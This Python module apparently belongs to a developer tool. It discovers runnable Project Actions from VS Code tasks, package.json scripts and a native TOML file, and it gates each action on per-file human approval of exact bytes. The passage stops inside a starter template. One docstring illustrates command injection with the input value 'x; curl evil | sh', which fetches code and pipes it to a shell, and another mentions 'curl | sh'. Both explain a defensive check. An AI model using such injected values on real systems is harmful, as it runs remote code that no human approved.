from __future__ import annotations

import hashlib
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import tomllib
from collections.abc import Callable, Sequence
from dataclasses import dataclass, field, replace
from pathlib import Path
from typing import Any

from .config import Config
from .profiles import resolve_profile
from .spawn_contract import parse_spawn_env, resolve_contained_cwd

ACTION_FILES = (Path(".vscode/tasks.json"), Path("package.json"), Path(".swe-mux/actions.toml"))
MAX_ACTIONS = 128
MAX_STEPS = 32
MAX_INPUTS = 16
MAX_INPUT_VALUE = 4096
# Step timeouts are a bound on a task, not on a service. A step that legitimately
# runs for hours is a long-lived process and should not declare one at all.
MAX_STEP_TIMEOUT_SECONDS = 86_400
# What a source file's approved bytes may occupy in the trust store. Above it the
# digest is still stored and the diff reports that it is too large, rather than the
# store growing without bound for a generated `package.json`.
MAX_APPROVED_SNAPSHOT_BYTES = 128 * 1024
# What the editor may save. Generous for a manifest and small enough that the whole
# file stays reviewable in one approval dialog, which is the point of the format.
MAX_ACTIONS_SOURCE_BYTES = 64 * 1024
PLATFORMS = ("windows", "linux", "darwin")
_VARIABLE = re.compile(r"\$\{([^}]+)\}")
_INPUT_REFERENCE = re.compile(r"\$\{input:([A-Za-z0-9_.-]+)\}")


SCHEMA_ASSET = Path(__file__).with_name("assets") / "project-actions-schema.md"


def project_actions_schema() -> str:
    """The `.swe-mux/actions.toml` authoring reference, as text.

    Shipped as a package asset rather than as a string literal so one file serves
    both readers: a person opening it in the repository, and an agent asking
    `project_actions(include_schema: true)`. Two copies would drift, and the copy an
    agent reads is the one that must be right.

    Returns a short explanatory line rather than raising if the asset is missing:
    an incomplete bundle should degrade the answer, not fail the tool call that a
    caller made for other reasons too.
    """
    try:
        return SCHEMA_ASSET.read_text(encoding="utf-8")
    except OSError:
        return (
            "The Project Actions authoring reference is not available in this build. "
            "It lives at src/swe_mux/assets/project-actions-schema.md in the source tree."
        )


def current_platform() -> str:
    """This host's name in the vocabulary `platforms` uses.

    The same three names launch profiles use (`config.LaunchProfile.platforms`), so a
    reader who has met one has met both.
    """
    if os.name == "nt":
        return "windows"
    return "darwin" if sys.platform == "darwin" else "linux"


@dataclass(frozen=True, slots=True)
class ActionInput:
    """A value the user supplies when running an action.

    Declared rather than inlined so one action covers a family of commands, which is
    what stops a repository accumulating `deploy-staging`, `deploy-prod`, and
    `deploy-prod-verbose` as three near-identical entries.

    The substitution happens at run time and never at discovery: the Run menu shows
    `${input:target}` in its preview, and the trust fingerprint therefore covers the
    template rather than one filled-in instance. An input cannot introduce a new
    command, because the value is substituted into an already-approved template and
    the resulting argv is passed as a spawn field rather than parsed by a shell.
    """

    id: str
    label: str
    default: str = ""
    kind: str = "string"
    options: tuple[str, ...] = ()

    def snapshot(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "label": self.label,
            "default": self.default,
            "kind": self.kind,
            "options": list(self.options),
        }


@dataclass(frozen=True, slots=True)
class ActionStep:
    name: str
    kind: str
    command: str
    args: tuple[str, ...] = ()
    cwd: str = ""
    env: dict[str, str] = field(default_factory=dict)
    shell_executable: str | None = None
    shell_args: tuple[str, ...] = ()
    #: Hosts this step runs on. Empty means every host.
    platforms: tuple[str, ...] = ()
    #: Seconds after which the step's process tree is stopped. None means no bound.
    timeout_seconds: float | None = None

    def preview(self) -> str:
        return " ".join((self.command, *self.args)).strip()

    def runs_here(self) -> bool:
        return not self.platforms or current_platform() in self.platforms

    def substituted(self, values: dict[str, str]) -> ActionStep:
        """This step with every `${input:id}` replaced by the supplied value."""

        def fill(text: str) -> str:
            return _INPUT_REFERENCE.sub(lambda match: values.get(match.group(1), ""), text)

        return replace(
            self,
            command=fill(self.command),
            args=tuple(fill(item) for item in self.args),
            cwd=fill(self.cwd) if self.cwd else self.cwd,
            env={key: fill(value) for key, value in self.env.items()},
        )


@dataclass(frozen=True, slots=True)
class ProjectAction:
    id: str
    label: str
    source: str
    batches: tuple[tuple[ActionStep, ...], ...]
    #: Free text stating what the action is for. Agent-facing above all: the id and
    #: label are usually a verb, and a caller choosing between actions has nothing
    #: else to read.
    description: str = ""
    inputs: tuple[ActionInput, ...] = ()
    #: The task file this action came from, relative to the Project root, as posix.
    #: Trust is per file, so an action cannot be run without knowing which file's
    #: approval covers it.
    source_path: str = ""

    @property
    def steps(self) -> tuple[ActionStep, ...]:
        return tuple(step for batch in self.batches for step in batch)

    def snapshot(self, *, trusted: bool = False) -> dict[str, Any]:
        return {
            "id": self.id,
            "label": self.label,
            "description": self.description,
            "source": self.source,
            "source_path": self.source_path,
            "trusted": trusted,
            "inputs": [item.snapshot() for item in self.inputs],
            "steps": [
                {
                    "name": step.name,
                    "kind": step.kind,
                    "command": step.preview(),
                    "cwd": step.cwd,
                    "platforms": list(step.platforms),
                    "timeout_seconds": step.timeout_seconds,
                }
                for step in self.steps
            ],
        }


@dataclass(frozen=True, slots=True)
class ActionSource:
    """One task file's contribution and its own approval state.

    Per file rather than per catalog because the three files are authored by
    different people for different reasons. One combined digest meant an agent
    writing `.swe-mux/actions.toml` un-trusted the VS Code tasks and the package
    scripts as well, so every entry in the Run menu needed a fresh human approval
    for a change that touched none of them.
    """

    path: str
    present: bool
    fingerprint: str
    trusted: bool

    def snapshot(self) -> dict[str, Any]:
        return {
            "path": self.path,
            "present": self.present,
            "fingerprint": self.fingerprint,
            "trusted": self.trusted,
        }


@dataclass(frozen=True, slots=True)
class ActionCatalog:
    root: str
    fingerprint: str
    trusted: bool
    sources: tuple[str, ...]
    actions: tuple[ProjectAction, ...]
    diagnostics: tuple[str, ...]
    #: Per-file approval state. `sources` stays a list of present paths for the
    #: clients that only ever showed a file list.
    files: tuple[ActionSource, ...] = ()

    def trusted_paths(self) -> frozenset[str]:
        return frozenset(item.path for item in self.files if item.trusted)

    def snapshot(self) -> dict[str, Any]:
        approved = self.trusted_paths()
        return {
            "project_root": self.root,
            "fingerprint": self.fingerprint,
            # True only when every present file is approved, which is what the Run
            # menu's whole-catalog trust prompt has always meant.
            "trusted": self.trusted,
            "sources": list(self.sources),
            "files": [item.snapshot() for item in self.files],
            "actions": [
                action.snapshot(trusted=action.source_path in approved) for action in self.actions
            ],
            "diagnostics": list(self.diagnostics),
        }


def _strip_json_comments(text: str) -> str:
    result: list[str] = []
    index = 0
    quote = False
    escaped = False
    while index < len(text):
        char = text[index]
        if quote:
            result.append(char)
            if escaped:
                escaped = False
            elif char == "\\":
                escaped = True
            elif char == '"':
                quote = False
            index += 1
            continue
        if char == '"':
            quote = True
            result.append(char)
            index += 1
            continue
        if text.startswith("//", index):
            while index < len(text) and text[index] not in "\r\n":
                result.append(" ")
                index += 1
            continue
        if text.startswith("/*", index):
            result.extend("  ")
            index += 2
            while index < len(text) and not text.startswith("*/", index):
                result.append("\n" if text[index] == "\n" else " ")
                index += 1
            if index < len(text):
                result.extend("  ")
                index += 2
            continue
        result.append(char)
        index += 1
    return "".join(result)


def _strip_trailing_commas(text: str) -> str:
    result: list[str] = []
    quote = False
    escaped = False
    index = 0
    while index < len(text):
        char = text[index]
        if quote:
            result.append(char)
            if escaped:
                escaped = False
            elif char == "\\":
                escaped = True
            elif char == '"':
                quote = False
            index += 1
            continue
        if char == '"':
            quote = True
        if char == ",":
            lookahead = index + 1
            while lookahead < len(text) and text[lookahead].isspace():
                lookahead += 1
            if lookahead < len(text) and text[lookahead] in "}]":
                index += 1
                continue
        result.append(char)
        index += 1
    return "".join(result)


def loads_jsonc(text: str) -> Any:
    return json.loads(_strip_trailing_commas(_strip_json_comments(text)))


def _resolve_value(value: str, root: Path, *, inputs: frozenset[str] = frozenset()) -> str:
    """Expand the bounded variable set, leaving `${input:id}` for run time.

    An input reference survives discovery intact so the Run menu preview, the trust
    dialog, and the fingerprint all describe the *template*. Filling it in here would
    mean the approved bytes and the executed command could differ.
    """

    def expand(match: re.Match[str]) -> str:
        name = match.group(1)
        if name == "workspaceFolder":
            return str(root)
        if name == "workspaceFolderBasename":
            return root.name
        if name == "pathSeparator":
            return os.sep
        if name.startswith("env:"):
            return os.environ.get(name[4:], "")
        if name.startswith("input:"):
            identifier = name[6:]
            if identifier not in inputs:
                raise ValueError(f"undeclared input: ${{{name}}}")
            return match.group(0)
        raise ValueError(f"unsupported variable: ${{{name}}}")

    return _VARIABLE.sub(expand, value)


def _platforms(value: Any, label: str) -> tuple[str, ...]:
    if value is None:
        return ()
    if not isinstance(value, list) or not all(isinstance(item, str) for item in value):
        raise ValueError(f"{label} platforms must be an array of strings")
    unknown = sorted(set(value) - set(PLATFORMS))
    if unknown:
        raise ValueError(
            f"{label} platforms must be drawn from {', '.join(PLATFORMS)}: {', '.join(unknown)}"
        )
    return tuple(dict.fromkeys(value))


def _timeout(value: Any, label: str) -> float | None:
    if value is None:
        return None
    if isinstance(value, bool) or not isinstance(value, (int, float)):
        raise ValueError(f"{label} timeout_seconds must be a number")
    seconds = float(value)
    if not 0 < seconds <= MAX_STEP_TIMEOUT_SECONDS:
        raise ValueError(
            f"{label} timeout_seconds must be above 0 and at most {MAX_STEP_TIMEOUT_SECONDS}"
        )
    return seconds


def _cwd(value: str | None, root: Path, inputs: frozenset[str] = frozenset()) -> str:
    if not value:
        return resolve_contained_cwd("", root)
    resolved = _resolve_value(value, root, inputs=inputs)
    if _INPUT_REFERENCE.search(resolved):
        # Containment cannot be checked against a template, so it is checked again
        # after substitution, in `substituted_action`. Returning the template here
        # keeps the preview honest about what will run.
        return resolved
    return resolve_contained_cwd(resolved, root)


def _strings(value: Any, field_name: str) -> tuple[str, ...]:
    if value is None:
        return ()
    if not isinstance(value, list) or not all(isinstance(item, str) for item in value):
        raise ValueError(f"{field_name} must be an array of strings")
    return tuple(value)


def _environment(value: Any, root: Path, inputs: frozenset[str] = frozenset()) -> dict[str, str]:
    # Shape and size are the spawn contract's rules (one implementation, one set of
    # limits); only variable expansion is specific to a task file.
    return {
        key: _resolve_value(item, root, inputs=inputs)
        for key, item in parse_spawn_env(value).items()
    }


def _vscode_step(
    raw: dict[str, Any], root: Path, inputs: frozenset[str] = frozenset()
) -> ActionStep | None:
    task_type = str(raw.get("type") or "shell")
    if task_type not in {"shell", "process"} or not isinstance(raw.get("command"), str):
        return None
    label = str(raw.get("label") or raw["command"])
    raw_options = raw.get("options")
    options: dict[str, Any] = raw_options if isinstance(raw_options, dict) else {}
    raw_shell = options.get("shell")
    shell: dict[str, Any] = raw_shell if isinstance(raw_shell, dict) else {}
    return ActionStep(
        name=label,
        kind=task_type,
        command=_resolve_value(str(raw["command"]), root, inputs=inputs),
        args=tuple(
            _resolve_value(item, root, inputs=inputs) for item in _strings(raw.get("args"), "args")
        ),
        cwd=_cwd(str(options["cwd"]) if options.get("cwd") is not None else None, root, inputs),
        env=_environment(options.get("env"), root, inputs),
        shell_executable=(
            _resolve_value(str(shell["executable"]), root) if shell.get("executable") else None
        ),
        shell_args=tuple(
            _resolve_value(item, root) for item in _strings(shell.get("args"), "shell.args")
        ),
    )


def _vscode_inputs(document: dict[str, Any]) -> tuple[ActionInput, ...]:
    """VS Code's own `inputs` array, restricted to the two prompt kinds.

    `command` inputs are excluded deliberately: they run an editor command to
    produce a value, which has no meaning outside VS Code and would be a second
    execution path if it did.
    """
    raw_inputs = document.get("inputs")
    if not isinstance(raw_inputs, list):
        return ()
    declared: list[ActionInput] = []
    for item in raw_inputs:
        if not isinstance(item, dict):
            continue
        identifier = str(item.get("id") or "").strip()
        kind = str(item.get("type") or "promptString")
        if not identifier or kind not in {"promptString", "pickString"}:
            continue
        options = _strings(item.get("options"), "input options") if kind == "pickString" else ()
        if kind == "pickString" and not options:
            # VS Code treats a `pickString` with no options as a broken input too.
            # Dropped rather than imported as an unrunnable prompt.
            continue
        default = str(item.get("default") or "")
        declared.append(
            ActionInput(
                identifier,
                str(item.get("description") or identifier),
                default or (options[0] if options else ""),
                "choice" if kind == "pickString" else "string",
                options,
            )
        )
    return tuple(declared[:MAX_INPUTS])


def _vscode_actions(path: Path, root: Path) -> tuple[list[ProjectAction], list[str]]:
    if not path.is_file():
        return [], []
    document = loads_jsonc(path.read_text(encoding="utf-8"))
    if not isinstance(document, dict) or not isinstance(document.get("tasks", []), list):
        raise ValueError(".vscode/tasks.json must contain a tasks array")
    raw_tasks = [item for item in document["tasks"] if isinstance(item, dict)]
    by_label = {str(item.get("label") or ""): item for item in raw_tasks if item.get("label")}
    diagnostics: list[str] = []
    declared_inputs = _vscode_inputs(document)
    input_ids = frozenset(item.id for item in declared_inputs)

    def expand(label: str, trail: tuple[str, ...] = ()) -> tuple[tuple[ActionStep, ...], ...]:
        if label in trail:
            raise ValueError(f"VS Code task dependency cycle: {' -> '.join((*trail, label))}")
        raw = by_label.get(label)
        if raw is None:
            raise ValueError(f"VS Code task dependency is missing: {label}")
        depends = raw.get("dependsOn", [])
        dependencies = [depends] if isinstance(depends, str) else depends
        if not isinstance(dependencies, list) or not all(
            isinstance(item, str) for item in dependencies
        ):
            raise ValueError(f"VS Code task {label} has an invalid dependsOn")
        batches: list[tuple[ActionStep, ...]] = []
        if dependencies:
            expanded = [expand(item, (*trail, label)) for item in dependencies]
            if raw.get("dependsOrder") == "sequence":
                diagnostics.append(
                    f"{label}: sequential dependencies are started in order; "
                    "completion gating is not imported"
                )
                for dependency in expanded:
                    batches.extend(dependency)
            else:
                parallel = tuple(
                    step for dependency in expanded for batch in dependency for step in batch
                )
                if parallel:
                    batches.append(parallel)
        step = _vscode_step(raw, root, input_ids)
        if step:
            batches.append((step,))
        return tuple(batches)

    source_path = ACTION_FILES[0].as_posix()
    actions: list[ProjectAction] = []
    for raw in raw_tasks:
        label = str(raw.get("label") or raw.get("command") or "").strip()
        if not label:
            continue
        try:
            batches = expand(label)
        except ValueError as exc:
            diagnostics.append(f"{label}: {exc}")
            continue
        if not batches:
            diagnostics.append(f"{label}: unsupported task type or missing command")
            continue
        batches, dropped = _for_this_platform(batches)
        if dropped:
            diagnostics.append(f"{label}: {dropped} step(s) do not run on {current_platform()}")
        if not batches:
            diagnostics.append(f"{label}: no step runs on {current_platform()}")
            continue
        try:
            _reject_unquotable_inputs(
                tuple(step for batch in batches for step in batch), label
            )
        except ValueError as exc:
            diagnostics.append(str(exc))
            continue
        used = _referenced_inputs(batches)
        actions.append(
            ProjectAction(
                f"vscode:{label}",
                label,
                "vscode",
                batches,
                description=str(raw.get("detail") or ""),
                inputs=tuple(item for item in declared_inputs if item.id in used),
                source_path=source_path,
            )
        )
    return actions, diagnostics


def _for_this_platform(
    batches: tuple[tuple[ActionStep, ...], ...],
) -> tuple[tuple[tuple[ActionStep, ...], ...], int]:
    """Drop steps this host cannot run, and say how many were dropped.

    Dropped rather than refused: a repository that declares a Windows step and a
    Linux step is describing one action with two implementations, and refusing the
    whole action on both hosts would make the declaration useless. An action left
    with no runnable step becomes a diagnostic, which is the honest report.
    """
    kept: list[tuple[ActionStep, ...]] = []
    dropped = 0
    for batch in batches:
        runnable = tuple(step for step in batch if step.runs_here())
        dropped += len(batch) - len(runnable)
        if runnable:
            kept.append(runnable)
    return tuple(kept), dropped


def _reject_unquotable_inputs(steps: tuple[ActionStep, ...], label: str) -> None:
    """Refuse an input reference that would reach a shell as syntax, not as a value.

    Every other place an input lands is quoted or is not shell-parsed at all:
    a `process` step's argv goes to CreateProcess verbatim, `cwd` and `env` are
    spawn fields, and a `shell` step *with* args has both its command and each arg
    quoted for the target shell by `_shell_command_line`.

    The exception is a `shell` step with no args, whose command string is passed
    through untouched so repository-authored shell syntax keeps working. An input
    substituted there would be shell syntax too, so
    `command = "git checkout ${input:branch}"` with `branch = "x; curl evil | sh"`
    would run a second command that no human ever approved. That is precisely the
    property the trust boundary rests on, so it is refused at discovery rather than
    quoted at run time: quoting would need the shell dialect, which is not resolved
    until spawn, and a rule the author can see is better than one they cannot.
    """
    for step in steps:
        if step.kind != "shell" or step.args:
            continue
        if _INPUT_REFERENCE.search(step.command):
            raise ValueError(
                f"{label}: a shell step with no args passes its command to the shell "
                f"unquoted, so it cannot carry an input. Move the value into args "
                f'(command = "git", args = ["checkout", "${{input:...}}"]) or use '
                f'type = "process".'
            )


def _referenced_inputs(batches: tuple[tuple[ActionStep, ...], ...]) -> frozenset[str]:
    """Every `${input:id}` these steps name.

    An action carries only the inputs it uses, so a file declaring ten inputs does
    not prompt for all ten on every action.
    """
    found: set[str] = set()
    for batch in batches:
        for step in batch:
            for text in (step.command, step.cwd, *step.args, *step.env.values()):
                found.update(match.group(1) for match in _INPUT_REFERENCE.finditer(text))
    return frozenset(found)


def _package_actions(path: Path, root: Path) -> list[ProjectAction]:
    if not path.is_file():
        return []
    document = json.loads(path.read_text(encoding="utf-8"))
    scripts = document.get("scripts", {}) if isinstance(document, dict) else {}
    if not isinstance(scripts, dict):
        raise ValueError("package.json scripts must be an object")
    manager = (
        "pnpm"
        if (root / "pnpm-lock.yaml").is_file()
        else "yarn"
        if (root / "yarn.lock").is_file()
        else "bun"
        if (root / "bun.lock").is_file() or (root / "bun.lockb").is_file()
        else "npm"
    )
    source_path = ACTION_FILES[1].as_posix()
    actions: list[ProjectAction] = []
    for name, command in scripts.items():
        if not isinstance(name, str) or not isinstance(command, str):
            continue
        step = ActionStep(
            name=name, kind="process", command=manager, args=("run", name), cwd=str(root)
        )
        actions.append(
            ProjectAction(
                f"package:{name}",
                name,
                "package",
                ((step,),),
                # The script body itself is the only description a package script has,
                # and it is what a caller needs to tell `build` from `build:watch`.
                description=command,
                source_path=source_path,
            )
        )
    return actions


def _native_step(
    raw: dict[str, Any], label: str, root: Path, inputs: frozenset[str] = frozenset()
) -> ActionStep:
    command = raw.get("command")
    if not isinstance(command, str) or not command.strip():
        raise ValueError(f"native action {label} step requires command")
    kind = str(raw.get("type") or "shell")
    if kind not in {"shell", "process"}:
        raise ValueError(f"native action {label} type must be shell or process")
    return ActionStep(
        name=str(raw.get("name") or label),
        kind=kind,
        command=_resolve_value(command, root, inputs=inputs),
        args=tuple(
            _resolve_value(item, root, inputs=inputs) for item in _strings(raw.get("args"), "args")
        ),
        cwd=_cwd(str(raw["cwd"]) if raw.get("cwd") is not None else None, root, inputs),
        env=_environment(raw.get("env"), root, inputs),
        platforms=_platforms(raw.get("platforms"), f"native action {label}"),
        timeout_seconds=_timeout(raw.get("timeout_seconds"), f"native action {label}"),
    )


def _native_inputs(raw: dict[str, Any], label: str) -> tuple[ActionInput, ...]:
    declared = raw.get("inputs")
    if declared is None:
        return ()
    if not isinstance(declared, list) or len(declared) > MAX_INPUTS:
        raise ValueError(f"native action {label} inputs must be at most {MAX_INPUTS} tables")
    parsed: list[ActionInput] = []
    for item in declared:
        if not isinstance(item, dict):
            raise ValueError(f"native action {label} inputs must be tables")
        identifier = str(item.get("id") or "").strip()
        if not re.fullmatch(r"[A-Za-z0-9_.-]+", identifier):
            raise ValueError(
                f"native action {label} input id must use letters, digits, dot, dash, "
                f"or underscore"
            )
        kind = str(item.get("kind") or "string")
        if kind not in {"string", "choice"}:
            raise ValueError(f"native action {label} input kind must be string or choice")
        options = _strings(item.get("options"), f"native action {label} input options")
        if kind == "choice" and not options:
            raise ValueError(f"native action {label} choice input requires options")
        default = str(item.get("default") or "")
        if kind == "choice" and default and default not in options:
            raise ValueError(f"native action {label} input default must be one of its options")
        if kind == "choice" and not default:
            # A choice with no default is unrunnable as presented: the empty string
            # matches no option, so the select renders blank and submitting it fails
            # the same validation. The first option is the only defensible answer,
            # and it is the one a picker would have shown at the top anyway.
            default = options[0]
        parsed.append(
            ActionInput(identifier, str(item.get("label") or identifier), default, kind, options)
        )
    identifiers = [item.id for item in parsed]
    if len(set(identifiers)) != len(identifiers):
        raise ValueError(f"native action {label} input ids must be unique")
    return tuple(parsed)


def _native_actions(path: Path, root: Path) -> tuple[list[ProjectAction], list[str]]:
    if not path.is_file():
        return [], []
    return parse_native_actions(path.read_text(encoding="utf-8"), root)


def parse_native_actions(text: str, root: Path) -> tuple[list[ProjectAction], list[str]]:
    """Parse `.swe-mux/actions.toml` content, without reading it from disk.

    Split out so the editor can validate what the user typed *before* it is written.
    Saving a file that fails to parse would leave the Run menu showing one import
    diagnostic and no way to see what was wrong except by opening it again, and it
    would replace a working file with a broken one.
    """
    document = tomllib.loads(text)
    if int(document.get("version", 0)) != 1 or not isinstance(document.get("actions", []), list):
        raise ValueError(".swe-mux/actions.toml requires version = 1 and [[actions]]")
    source_path = ACTION_FILES[2].as_posix()
    actions: list[ProjectAction] = []
    diagnostics: list[str] = []
    # `.get("actions", [])` above validates the type and tolerates the key being
    # absent, so reading it back with `document["actions"]` raised `KeyError` for a
    # file holding only `version = 1`. The catalog catches ValueError and TypeError,
    # not KeyError, so that surfaced as a 500 rather than as an import diagnostic.
    for raw in document.get("actions", []):
        if not isinstance(raw, dict):
            raise ValueError("native actions must be tables")
        action_id = str(raw.get("id") or "").strip()
        label = str(raw.get("label") or action_id).strip()
        if not action_id or not label or not re.fullmatch(r"[A-Za-z0-9_.-]+", action_id):
            raise ValueError("native action id must use letters, digits, dot, dash, or underscore")
        declared_inputs = _native_inputs(raw, label)
        input_ids = frozenset(item.id for item in declared_inputs)
        raw_steps = raw.get("steps")
        steps: tuple[ActionStep, ...]
        if raw_steps is None:
            steps = (_native_step(raw, label, root, input_ids),)
        elif isinstance(raw_steps, list) and 0 < len(raw_steps) <= MAX_STEPS:
            steps = tuple(
                _native_step(step, label, root, input_ids)
                for step in raw_steps
                if isinstance(step, dict)
            )
            if len(steps) != len(raw_steps):
                raise ValueError(f"native action {label} contains an invalid step")
        else:
            raise ValueError(f"native action {label} steps must contain 1-{MAX_STEPS} tables")
        batches: tuple[tuple[ActionStep, ...], ...] = (
            tuple((step,) for step in steps) if raw.get("sequential") else (steps,)
        )
        # An action's own `platforms` applies to every step that did not narrow it
        # further, so the common "this whole action is Windows-only" needs one line.
        action_platforms = _platforms(raw.get("platforms"), f"native action {label}")
        if action_platforms:
            batches = tuple(
                tuple(
                    step if step.platforms else replace(step, platforms=action_platforms)
                    for step in batch
                )
                for batch in batches
            )
        batches, dropped = _for_this_platform(batches)
        if dropped:
            diagnostics.append(f"{label}: {dropped} step(s) do not run on {current_platform()}")
        if not batches:
            diagnostics.append(f"{label}: no step runs on {current_platform()}")
            continue
        _reject_unquotable_inputs(tuple(step for batch in batches for step in batch), label)
        used = _referenced_inputs(batches)
        unused = sorted(input_ids - used)
        if unused:
            diagnostics.append(
                f"{label}: declared inputs are never referenced: {', '.join(unused)}"
            )
        actions.append(
            ProjectAction(
                f"native:{action_id}",
                label,
                "native",
                batches,
                description=str(raw.get("description") or ""),
                inputs=tuple(item for item in declared_inputs if item.id in used),
                source_path=source_path,
            )
        )
    return actions, diagnostics


class ProjectActionService:
    """Discovery and approval for one machine's Project Actions.

    Approval is stored per source file rather than per catalog. The three task files
    are authored by different people for different reasons, and one combined digest
    meant that editing `.swe-mux/actions.toml` also un-trusted the VS Code tasks and
    the package scripts, so every Run menu entry needed a fresh human approval for a
    change that touched none of them. Now common: an agent authors an action.

    The approved bytes are retained alongside the digest so the approval dialog can
    show what changed. A reader asked to approve "these files changed" has no way to
    tell a renamed label from a new `curl | sh`.
    """

    def __init__(self, data_dir: Path) -> None:
        self.path = data_dir / "project-action-trust.json"

    def _store(self) -> dict[str, Any]:
        try:
            value = json.loads(self.path.read_text(encoding="utf-8"))
            return value if isinstance(value, dict) else {}
        except (OSError, ValueError, TypeError):
            return {}

    def _entry(self, root: str, combined: str, present: dict[str, str]) -> dict[str, str]:
        """The approved digest per path for one Project root.

        A stored string is the pre-per-file format: one digest over the presence and
        bytes of all three files. It is honoured exactly as it used to be. If it
        still matches, nothing has changed since that approval, so every present file
        is approved; if it does not, the old format could not say which file moved,
        so nothing is.
        """
        stored = self._store().get(root)
        if isinstance(stored, str):
            return dict(present) if stored == combined else {}
        if not isinstance(stored, dict):
            return {}
        files = stored.get("files")
        if not isinstance(files, dict):
            return {}
        return {str(key): str(value) for key, value in files.items() if isinstance(value, str)}

    def approved_source(self, project_root: str, path: str) -> str | None:
        """The approved text of one task file, or None when none was retained.

        None does not mean "never approved": a file above
        `MAX_APPROVED_SNAPSHOT_BYTES` stores its digest with no snapshot, and a file
        approved under the pre-per-file store has neither. Callers that need to tell
        those apart ask :meth:`was_approved`.
        """
        stored = self._store().get(str(Path(project_root).resolve()))
        if not isinstance(stored, dict):
            return None
        snapshots = stored.get("snapshots")
        if not isinstance(snapshots, dict):
            return None
        value = snapshots.get(path)
        return value if isinstance(value, str) else None

    def was_approved(self, project_root: str, path: str) -> bool:
        """Whether this file has ever been approved, whatever its bytes were then."""
        stored = self._store().get(str(Path(project_root).resolve()))
        if isinstance(stored, str):
            # The pre-per-file store approved everything present at once.
            return True
        if not isinstance(stored, dict):
            return False
        files = stored.get("files")
        return isinstance(files, dict) and path in files

    def _fingerprint(self, root: Path) -> tuple[str, tuple[str, ...], dict[str, str]]:
        """The combined digest, the present paths, and the per-file digests.

        The combined digest keeps its exact previous construction, including the
        `missing` marker for an absent file. It is still what the whole-catalog trust
        call approves, and changing it would silently un-trust every Project.
        """
        digest = hashlib.sha256()
        sources: list[str] = []
        per_file: dict[str, str] = {}
        for relative in ACTION_FILES:
            path = root / relative
            posix = relative.as_posix()
            digest.update(posix.encode())
            if path.is_file():
                data = path.read_bytes()
                digest.update(b"\0present\0")
                digest.update(data)
                sources.append(posix)
                per_file[posix] = hashlib.sha256(data).hexdigest()
            else:
                digest.update(b"\0missing\0")
        return digest.hexdigest(), tuple(sources), per_file

    def catalog(self, project_root: str) -> ActionCatalog:
        root = Path(project_root).resolve()
        fingerprint, sources, per_file = self._fingerprint(root)
        approved = self._entry(str(root), fingerprint, per_file)
        actions: list[ProjectAction] = []
        diagnostics: list[str] = []
        readers: tuple[
            tuple[str, Callable[[], tuple[list[ProjectAction], list[str]]]], ...
        ] = (
            ("VS Code tasks", lambda: _vscode_actions(root / ACTION_FILES[0], root)),
            ("package scripts", lambda: (_package_actions(root / ACTION_FILES[1], root), [])),
            ("native Project Actions", lambda: _native_actions(root / ACTION_FILES[2], root)),
        )
        for label, reader in readers:
            try:
                found, messages = reader()
                actions.extend(found)
                diagnostics.extend(messages)
            except (OSError, UnicodeDecodeError, ValueError, TypeError) as exc:
                diagnostics.append(f"{label}: {exc}")
        if len(actions) > MAX_ACTIONS:
            diagnostics.append(f"Only the first {MAX_ACTIONS} Project Actions are shown")
            actions = actions[:MAX_ACTIONS]
        seen: set[str] = set()
        unique: list[ProjectAction] = []
        for action in actions:
            if action.id in seen:
                diagnostics.append(f"Duplicate action ignored: {action.id}")
                continue
            seen.add(action.id)
            unique.append(action)
        files = tuple(
            ActionSource(
                relative.as_posix(),
                relative.as_posix() in per_file,
                per_file.get(relative.as_posix(), ""),
                relative.as_posix() in per_file
                and approved.get(relative.as_posix()) == per_file[relative.as_posix()],
            )
            for relative in ACTION_FILES
        )
        return ActionCatalog(
            str(root),
            fingerprint,
            # Every present file approved. A Project with no task files at all is not
            # "trusted"; there is nothing to trust and nothing to run.
            bool(sources) and all(item.trusted for item in files if item.present),
            sources,
            tuple(unique),
            tuple(dict.fromkeys(diagnostics)),
            files,
        )

    def trust(
        self, project_root: str, fingerprint: str, *, source: str | None = None
    ) -> ActionCatalog:
        """Approve every present task file, or exactly one of them.

        `source` names one path and `fingerprint` is then that file's own digest.
        Without it, `fingerprint` is the whole-catalog digest and the call approves
        everything present, which is what the Run menu's single prompt does.
        """
        catalog = self.catalog(project_root)
        _, _, per_file = self._fingerprint(Path(project_root).resolve())
        if source is not None:
            if source not in per_file:
                raise ValueError(f"no such Project task file: {source}")
            if fingerprint != per_file[source]:
                raise ValueError(f"{source} changed; review it again before trusting")
            approving = {source: per_file[source]}
        else:
            if fingerprint != catalog.fingerprint:
                raise ValueError("Project task files changed; review them again before trusting")
            approving = dict(per_file)
        store = self._store()
        existing = store.get(catalog.root)
        files: dict[str, str] = {}
        snapshots: dict[str, str] = {}
        if isinstance(existing, dict):
            raw_files, raw_snapshots = existing.get("files"), existing.get("snapshots")
            files = dict(raw_files) if isinstance(raw_files, dict) else {}
            snapshots = dict(raw_snapshots) if isinstance(raw_snapshots, dict) else {}
        files.update(approving)
        # A file that disappeared keeps no approval: re-adding it is a new file and
        # deserves a new look, which is what the `missing` marker always meant.
        files = {key: value for key, value in files.items() if key in per_file}
        snapshots = {key: value for key, value in snapshots.items() if key in per_file}
        for path in approving:
            snapshots.pop(path, None)
            try:
                data = (Path(project_root).resolve() / path).read_bytes()
            except OSError:
                continue
            if len(data) <= MAX_APPROVED_SNAPSHOT_BYTES:
                snapshots[path] = data.decode("utf-8", "replace")
        store[catalog.root] = {"files": files, "snapshots": snapshots}
        self.path.parent.mkdir(parents=True, exist_ok=True)
        temporary = self.path.with_suffix(".tmp")
        temporary.write_text(json.dumps(store, indent=2, sort_keys=True), encoding="utf-8")
        temporary.replace(self.path)
        return self.catalog(project_root)

    def action(self, project_root: str, action_id: str) -> tuple[ActionCatalog, ProjectAction]:
        catalog = self.catalog(project_root)
        action = next((item for item in catalog.actions if item.id == action_id), None)
        if action is None:
            raise KeyError(action_id)
        # Per action, not per catalog: an unapproved `package.json` no longer blocks
        # an approved `.swe-mux/actions.toml`. The file that defines *this* action is
        # the one that has to be approved.
        if action.source_path not in catalog.trusted_paths():
            raise PermissionError(
                f"{action.source_path} is not trusted or changed since approval"
            )
        return catalog, action


STARTER_ACTIONS_TOML = '''\
# Project Actions for this repository. Every action appears in the Run menu.
#
# An action is a manifest entry, not a program: no conditionals, no loops. Put
# logic in a script in the repo and point a `process` step at it.
#
# Nothing here runs because it exists. The first run of each action asks a human to
# approve this file's exact bytes, and every edit asks again.
version = 1

[[actions]]
id = "example"
label = "Example"
description = "What this action is for. Agents read this to tell two actions apart."
